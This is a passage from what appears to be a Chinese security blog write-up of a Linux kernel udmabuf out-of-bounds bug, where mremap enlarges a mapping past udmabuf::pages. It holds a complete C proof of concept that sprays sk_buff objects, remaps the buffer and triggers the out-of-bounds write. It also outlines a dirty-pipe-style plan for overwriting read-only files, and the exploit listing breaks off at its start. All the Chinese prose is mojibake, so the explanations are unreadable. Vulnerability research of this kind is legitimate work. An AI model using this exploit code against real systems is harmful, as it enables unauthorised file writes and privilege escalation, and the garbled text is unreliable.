*vmf)</span><br>&#123;<br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">vm_area_struct</span> *<span class="hljs-title">vma</span> =</span> vmf-&gt;vma;<br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">udmabuf</span> *<span class="hljs-title">ubuf</span> =</span> vma-&gt;vm_private_data;<br><br>vmf-&gt;page = ubuf-&gt;pages[vmf-&gt;pgoff];<br>get_page(vmf-&gt;page);<br><span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>æ³¨æ„åˆ° <code>udmabuf_vm_fault()</code> å‡½æ•°å¹¶æœªå¯¹ <code>vmf-&gt;pgoff</code> çš„å¤§å°è¿›è¡Œæ£€æŸ¥ï¼Œè¿™æ˜¯å› ä¸º  <code>dma-buf</code> çš„ <code>mmap()</code> è·¯å¾„ä¼šè°ƒç”¨åˆ° <code>dma_buf_mmap_internal()</code> ï¼Œåœ¨å…¶ä¸­ä¼šå…ˆè¿›è¡ŒèŒƒå›´æ£€æŸ¥åå†è°ƒç”¨ <code>dmabuf-&gt;ops-&gt;mmap()</code> ï¼Œå› æ­¤åœ¨ <em>æ­£å¸¸è¯»å†™</em> çš„æƒ…å†µä¸‹å¹¶ä¸ä¼šè¶…å‡º <code>udmabuf::pages</code> çš„èŒƒå›´ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">static</span> <span class="hljs-type">int</span> <span class="hljs-title function_">dma_buf_mmap_internal</span><span class="hljs-params">(<span class="hljs-keyword">struct</span> file *file, <span class="hljs-keyword">struct</span> vm_area_struct *vma)</span><br>&#123;<br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">dma_buf</span> *<span class="hljs-title">dmabuf</span>;</span><br><br><span class="hljs-keyword">if</span> (!is_dma_buf_file(file))<br><span class="hljs-keyword">return</span> -EINVAL;<br><br>dmabuf = file-&gt;private_data;<br><br><span class="hljs-comment">/* check if buffer supports mmap */</span><br><span class="hljs-keyword">if</span> (!dmabuf-&gt;ops-&gt;mmap)<br><span class="hljs-keyword">return</span> -EINVAL;<br><br><span class="hljs-comment">/* check for overflowing the buffer&#x27;s size */</span><br><span class="hljs-keyword">if</span> (vma-&gt;vm_pgoff + vma_pages(vma) &gt;<br>    dmabuf-&gt;size &gt;&gt; PAGE_SHIFT)<br><span class="hljs-keyword">return</span> -EINVAL;<br><br><span class="hljs-keyword">return</span> dmabuf-&gt;ops-&gt;mmap(dmabuf, vma);<br>&#125;<br><br><span class="hljs-type">static</span> <span class="hljs-type">const</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">file_operations</span> <span class="hljs-title">dma_buf_fops</span> =</span> &#123;<br><span class="hljs-comment">/* ... */</span><br>.mmap= dma_buf_mmap_internal,<br></code></pre></td></tr></table></figure><p>ä½†è¿™å­˜åœ¨ä¸€ä¸ªé—®é¢˜â€”â€” <code>mmap()</code> æ‰€æ˜ å°„çš„åŒºåŸŸæ˜¯å¯ä»¥è¢«æ‰©å±•ï¼ˆexpandï¼‰å’Œæ”¶ç¼©ï¼ˆshrinkï¼‰çš„ï¼Œè¿™ä¸€èˆ¬å¯ä»¥é€šè¿‡ <code>mremap()</code> ç³»ç»Ÿè°ƒç”¨å®Œæˆï¼š</p><p><img src="https://s2.loli.net/2024/12/31/dctSPxWrJYBufqV.png"></p><p><code>mremap()</code> å¯ä»¥æ”¹å˜ä¸€ä¸ª <code>vm_area_struct</code> çš„åœ°å€ç©ºé—´å¤§å°ï¼Œè€Œè¿™ä¸ªåŠŸèƒ½é»˜è®¤å¼€å¯ï¼Œè‹¥è¦é™åˆ¶åˆ™éœ€è¦åœ¨ mmap æ—¶ä¸º <code>vm_area_struct::vm_flags</code> æ·»åŠ  <code>VM_DONTEXPAND</code> æ ‡å¿—ä½</p><blockquote><p>ä»¥ <code>kcov_mmap()</code> ä¸ºä¾‹ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">static</span> <span class="hljs-type">int</span> <span class="hljs-title function_">kcov_mmap</span><span class="hljs-params">(<span class="hljs-keyword">struct</span> file *filep, <span class="hljs-keyword">struct</span> vm_area_struct *vma)</span><br>&#123;<br><span class="hljs-comment">/* ... */</span><br>vma-&gt;vm_flags |= VM_DONTEXPAND;<br></code></pre></td></tr></table></figure></blockquote><p>è€Œ <code>udmabuf</code> çš„ <code>mmap()</code> è·¯å¾„ä¸Š <strong>å¹¶æœªä¸º vm_area_struct æ·»åŠ ä»»ä½•é™åˆ¶ï¼Œè¿™æ„å‘³ç€å¯ä»¥ç›´æ¥ç”¨ mremap æ”¹å˜å†…å­˜å—çš„å¤§å°</strong> â€”â€”è¿™æ„å‘³ç€ mmap åŒºåŸŸçš„ç¼ºé¡µå¼‚å¸¸ <strong>å¯ä»¥è¶…å‡º udmabuf::pages çš„èŒƒå›´ï¼Œå°†å…¶ç›¸é‚»å†…å­˜ä¸Šçš„æ•°æ®çœ‹ä½œä¸€ä¸ª page æŒ‡é’ˆè¿›è¡Œæ˜ å°„</strong> â€”â€”å³å­˜åœ¨è¶Šç•Œè¯»å†™æ¼æ´</p><p> <img src="https://s2.loli.net/2024/12/31/c3UShpumLf1qP5J.png"></p><h2 id="Proof-Of-Concept"><a href="#Proof-Of-Concept" class="headerlink" title="Proof-Of-Concept"></a>Proof-Of-Concept</h2><p>ç°åœ¨æˆ‘ä»¬æ¥è¿›è¡Œæ¼æ´éªŒè¯ï¼Œæˆ‘ä»¬é¦–å…ˆåœ¨ <code>udmabuf::pages</code> æ—è¾¹å †å–·ä¸€å¤§å †çš„åƒåœ¾æ•°æ®ï¼Œä¹‹åå†ä½¿ç”¨ <code>mremap()</code> æ‰©å±• <code>mmap()</code> åŒºåŸŸï¼Œéšåè¯»å†™ <code>mmap()</code> åŒºåŸŸä»¥è§¦å‘ç¼ºé¡µå¼‚å¸¸æ¥è§¦å‘å†…æ ¸è¶Šç•Œè¯»å†™ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">define</span> _GNU_SOURCE</span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdlib.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;unistd.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;fcntl.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;string.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/ioctl.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/mman.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/wait.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/socket.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;linux/udmabuf.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sched.h&gt;</span></span><br><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> SOCKET_NUM 8</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> SK_BUFF_NUM 4</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> UDMA_PAGE_NR 128</span><br><br><span class="hljs-type">int</span> <span class="hljs-title function_">init_socket_array</span><span class="hljs-params">(<span class="hljs-type">int</span> sk_socket[SOCKET_NUM][<span class="hljs-number">2</span>])</span><br>&#123;<br>    <span class="hljs-comment">/* socket pairs to spray sk_buff */</span><br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; SOCKET_NUM; i++) &#123;<br>        <span class="hljs-keyword">if</span> (socketpair(AF_UNIX, SOCK_STREAM, <span class="hljs-number">0</span>, sk_socket[i]) &lt; <span class="hljs-number">0</span>) &#123;<br>            <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;[x] failed to create no.%d socket pair!\n&quot;</span>, i);<br>            <span class="hljs-keyword">return</span> <span class="hljs-number">-1</span>;<br>        &#125;<br>    &#125;<br><br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br><br><span class="hljs-type">int</span> <span class="hljs-title function_">spray_sk_buff</span><span class="hljs-params">(<span class="hljs-type">int</span> sk_socket[SOCKET_NUM][<span class="hljs-number">2</span>], <span class="hljs-type">void</span> *buf, <span class="hljs-type">size_t</span> size)</span><br>&#123;<br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; SOCKET_NUM; i++) &#123;<br>        <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> j = <span class="hljs-number">0</span>; j &lt; SK_BUFF_NUM; j++) &#123;<br>            <span class="hljs-keyword">if</span> (write(sk_socket[i][<span class="hljs-number">0</span>], buf, size) &lt; <span class="hljs-number">0</span>) &#123;<br>                <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;[x] failed to spray %d sk_buff for %d socket!&quot;</span>, j, i);<br>                <span class="hljs-keyword">return</span> <span class="hljs-number">-1</span>;<br>            &#125;<br>        &#125;<br>    &#125;<br><br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br><br><span class="hljs-type">void</span> <span class="hljs-title function_">bind_core</span><span class="hljs-params">(<span class="hljs-type">int</span> core)</span><br>&#123;<br>    <span class="hljs-type">cpu_set_t</span> cpu_set;<br><br>    CPU_ZERO(&amp;cpu_set);<br>    CPU_SET(core, &amp;cpu_set);<br>    sched_setaffinity(getpid(), <span class="hljs-keyword">sizeof</span>(cpu_set), &amp;cpu_set);<br><br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\033[34m\033[1m[*] Process binded to core \033[0m%d\n&quot;</span>, core);<br>&#125;<br><br><span class="hljs-type">void</span> <span class="hljs-title function_">proof_of_concept</span><span class="hljs-params">(<span class="hljs-type">void</span>)</span><br>&#123;<br>    <span class="hljs-type">int</span> dma_fd, dev_fd, mem_fd;<br>    <span class="hljs-type">char</span> *udma_buf, buf[<span class="hljs-number">0x1000</span>];<br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">udmabuf_create</span> <span class="hljs-title">info</span>;</span><br>    <span class="hljs-type">int</span> sk_socket[SOCKET_NUM][<span class="hljs-number">2</span>];<br><br>    <span class="hljs-comment">/* prepare stage */</span><br><br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;[*] Preparing...&quot;</span>);<br><br>    bind_core(<span class="hljs-number">0</span>);<br><br>    <span class="hljs-keyword">if</span> (init_socket_array(sk_socket) &lt; <span class="hljs-number">0</span>) &#123;<br>        perror(<span class="hljs-string">&quot;Unable to create socket for heap spray&quot;</span>);<br>        <span class="hljs-built_in">exit</span>(EXIT_FAILURE);<br>    &#125;<br><br>    mem_fd = memfd_create(<span class="hljs-string">&quot;test&quot;</span>, MFD_ALLOW_SEALING);<br>    <span class="hljs-keyword">if</span> (mem_fd &lt; <span class="hljs-number">0</span>) &#123;<br>        perror(<span class="hljs-string">&quot;Failed to create mem_fd&quot;</span>);<br>        <span class="hljs-built_in">exit</span>(EXIT_FAILURE);<br>    &#125;<br><br>    <span class="hljs-keyword">if</span> (ftruncate(mem_fd, <span class="hljs-number">0x1000</span> * UDMA_PAGE_NR) &lt; <span class="hljs-number">0</span>) &#123;<br>        perror(<span class="hljs-string">&quot;Failed to change size of mem_fd&quot;</span>);<br>        <span class="hljs-built_in">exit</span>(EXIT_FAILURE);<br>    &#125;<br><br>    <span class="hljs-keyword">if</span> (fcntl(mem_fd, F_ADD_SEALS, F_SEAL_SHRINK) &lt; <span class="hljs-number">0</span>) &#123;<br>        perror(<span class="hljs-string">&quot;Failed to seal mem_fd&quot;</span>);<br>        <span class="hljs-built_in">exit</span>(EXIT_FAILURE);<br>    &#125;<br><br>    dev_fd = open(<span class="hljs-string">&quot;/dev/udmabuf&quot;</span>, O_RDWR);<br>    <span class="hljs-keyword">if</span> (dev_fd &lt; <span class="hljs-number">0</span>) &#123;<br>        perror(<span class="hljs-string">&quot;Failed to open udmabuf dev file&quot;</span>);<br>        <span class="hljs-built_in">exit</span>(EXIT_FAILURE);<br>    &#125;<br><br>    <span class="hljs-built_in">strcpy</span>(buf, <span class="hljs-string">&quot;arttnba3&quot;</span>);<br><br>    <span class="hljs-comment">/* first heap spray */</span><br><br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;[*] Spraying sk_buff...&quot;</span>);<br><br>    <span class="hljs-keyword">if</span> (spray_sk_buff(sk_socket, buf, UDMA_PAGE_NR * <span class="hljs-keyword">sizeof</span>(<span class="hljs-type">void</span>*) - <span class="hljs-number">512</span>) &lt; <span class="hljs-number">0</span>) &#123;<br>        perror(<span class="hljs-string">&quot;Failed to do the heap spray&quot;</span>);<br>        <span class="hljs-built_in">exit</span>(EXIT_FAILURE);<br>    &#125;<br><br>    <span class="hljs-comment">/* allocate udmabuf::pages */</span><br><br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;[*] Allocating udmabuf...&quot;</span>);<br><br>    <span class="hljs-built_in">memset</span>(&amp;info, <span class="hljs-number">0</span>, <span class="hljs-keyword">sizeof</span>(info));<br>    info.memfd = mem_fd;<br>    info.size = <span class="hljs-number">0x1000</span> * UDMA_PAGE_NR;<br><br>    dma_fd = ioctl(dev_fd, UDMABUF_CREATE, &amp;info);<br>    <span class="hljs-keyword">if</span> (dma_fd &lt; <span class="hljs-number">0</span>) &#123;<br>        perror(<span class="hljs-string">&quot;Failed to create dma_buf&quot;</span>);<br>        <span class="hljs-built_in">exit</span>(EXIT_FAILURE);<br>    &#125;<br><br>    <span class="hljs-comment">/* second heap spray */</span><br><br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;[*] Spraying sk_buff...&quot;</span>);<br><br>    <span class="hljs-keyword">if</span> (spray_sk_buff(sk_socket, buf, UDMA_PAGE_NR * <span class="hljs-keyword">sizeof</span>(<span class="hljs-type">void</span>*) - <span class="hljs-number">512</span>) &lt; <span class="hljs-number">0</span>) &#123;<br>        perror(<span class="hljs-string">&quot;Failed to do the heap spray&quot;</span>);<br>        <span class="hljs-built_in">exit</span>(EXIT_FAILURE);<br>    &#125;<br><br>    <span class="hljs-comment">/* mmap stage */</span><br><br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;[*] MMAP and MREMAP udmabuf...&quot;</span>);<br><br>    udma_buf = mmap(<br>        <span class="hljs-literal">NULL</span>,<br>        <span class="hljs-number">0x1000</span> * UDMA_PAGE_NR,<br>        PROT_READ | PROT_WRITE,<br>        MAP_FILE | MAP_SHARED,<br>        dma_fd,<br>        <span class="hljs-number">0</span><br>    );<br>    <span class="hljs-keyword">if</span> (udma_buf == MAP_FAILED) &#123;<br>        perror(<span class="hljs-string">&quot;Failed to map dma_fd&quot;</span>);<br>        <span class="hljs-built_in">exit</span>(EXIT_FAILURE);<br>    &#125;<br><br>    udma_buf = mremap(<br>        udma_buf,<br>        <span class="hljs-number">0x1000</span> * UDMA_PAGE_NR,<br>        <span class="hljs-number">0x1000</span> * (UDMA_PAGE_NR + <span class="hljs-number">1</span>),<br>        MREMAP_MAYMOVE<br>    );<br>    <span class="hljs-keyword">if</span> (udma_buf == MAP_FAILED) &#123;<br>        perror(<span class="hljs-string">&quot;Failed to mremap dma_buf area&quot;</span>);<br>        <span class="hljs-built_in">exit</span>(EXIT_FAILURE);<br>    &#125;<br><br>    <span class="hljs-comment">/* trigger out-of-bound vulnerabilities */</span><br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;[*] Triggering...&quot;</span>);<br>    *(<span class="hljs-type">size_t</span>*) &amp;udma_buf[<span class="hljs-number">0x1000</span> * UDMA_PAGE_NR] = *(<span class="hljs-type">size_t</span>*) <span class="hljs-string">&quot;arttnba3&quot;</span>;<br>&#125;<br><br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">(<span class="hljs-type">int</span> argc, <span class="hljs-type">char</span> **argv, <span class="hljs-type">char</span> **envp)</span><br>&#123;<br>    proof_of_concept();<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;   <span class="hljs-comment">/* never arrive here... */</span><br>&#125;<br><br></code></pre></td></tr></table></figure><p>æˆåŠŸè®©å†…æ ¸å°è¯•å°†æˆ‘ä»¬çš„åƒåœ¾æ•°æ®ä½œä¸º <code>struct page*</code> æŒ‡é’ˆè¿›è¡Œæ˜ å°„ï¼š</p><p><img src="https://s2.loli.net/2025/01/01/2zapKWJb8lByN3G.png"></p><h1 id="0x02-æ¼æ´åˆ©ç”¨"><a href="#0x02-æ¼æ´åˆ©ç”¨" class="headerlink" title="0x02. æ¼æ´åˆ©ç”¨"></a>0x02. æ¼æ´åˆ©ç”¨</h1><h2 id="è¶Šç•Œæ˜ å°„-pipe-buffer-page-å®Œæˆæ–‡ä»¶è¶Šæƒè¯»å†™"><a href="#è¶Šç•Œæ˜ å°„-pipe-buffer-page-å®Œæˆæ–‡ä»¶è¶Šæƒè¯»å†™" class="headerlink" title="è¶Šç•Œæ˜ å°„ pipe_buffer::page å®Œæˆæ–‡ä»¶è¶Šæƒè¯»å†™"></a>è¶Šç•Œæ˜ å°„ <code>pipe_buffer::page</code> å®Œæˆæ–‡ä»¶è¶Šæƒè¯»å†™</h2><p>æœ‰äº†å°†è¶Šç•Œæ•°æ®ä½œä¸º <code>struct page</code> æŒ‡é’ˆè¿›è¡Œä½¿ç”¨çš„æƒèƒ½ï¼Œæ¥ä¸‹æ¥æˆ‘ä»¬è€ƒè™‘å¦‚ä½•è¿›è¡Œæ¼æ´åˆ©ç”¨ï¼Œæˆ‘ä»¬ä¸éš¾æƒ³åˆ°çš„æ˜¯å¯ä»¥å°†å¼€å¤´åŸç”Ÿæœ‰ç€åˆæ³• <code>struct page</code> æŒ‡é’ˆçš„ç»“æ„ä½“ä½œä¸º <code>victim object</code> ï¼Œè€Œå…¶ä¸­ä¸éš¾æƒ³åˆ°çš„æ˜¯ <code>struct pipe_buffer</code> ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">pipe_buffer</span> &#123;</span><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">page</span> *<span class="hljs-title">page</span>;</span><br><span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> offset, len;<br><span class="hljs-type">const</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">pipe_buf_operations</span> *<span class="hljs-title">ops</span>;</span><br><span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> flags;<br><span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> private;<br>&#125;;<br></code></pre></td></tr></table></figure><p>è€Œæƒ³åˆ° <code>pipe_buffer</code> ï¼Œæˆ‘ä»¬ä¸éš¾æƒ³åˆ° <a href="https://arttnba3.cn/2022/03/12/CVE-0X06-CVE-2022-0847/">CVE-2022-0847</a> ï¼Œå³ <code>dirty pipe</code> è¿™ä¸€åˆ©ç”¨æ‰‹æ³•â€”â€”<strong>é€šè¿‡ spice ç³»ç»Ÿè°ƒç”¨å°† pipe_buffer::page æ˜ å°„ä¸ºåªè¯»æ–‡ä»¶å†…å®¹ï¼Œä»è€Œå®Œæˆè¶Šæƒå†™å…¥æ“ä½œ</strong> ï¼š</p><ul><li>é¦–å…ˆå †å–· <code>pipe_buffer</code></li><li>æ¥ä¸‹æ¥åˆ†é… <code>udmabuf::pages</code></li><li>å†å †å–· <code>pipe_buffer</code> ï¼Œä»è€Œç¡®ä¿èƒ½å¤Ÿå°†  <code>udmabuf::pages</code> ç”¨ <code>pipe_buffer</code> åŒ…å›´</li><li>é€šè¿‡ splice ç³»ç»Ÿè°ƒç”¨æ˜ å°„åªè¯»æ–‡ä»¶åˆ°  <code>pipe_buffer::page</code> </li><li>é€šè¿‡æ¼æ´æ˜ å°„  <code>pipe_buffer::page</code> é¡µé¢å¹¶æ”¹å†™å†…å®¹</li></ul><p>æœ€ç»ˆçš„ exp å¦‚ä¸‹ï¼š </p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">define</span> _GNU_SOURCE</span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span 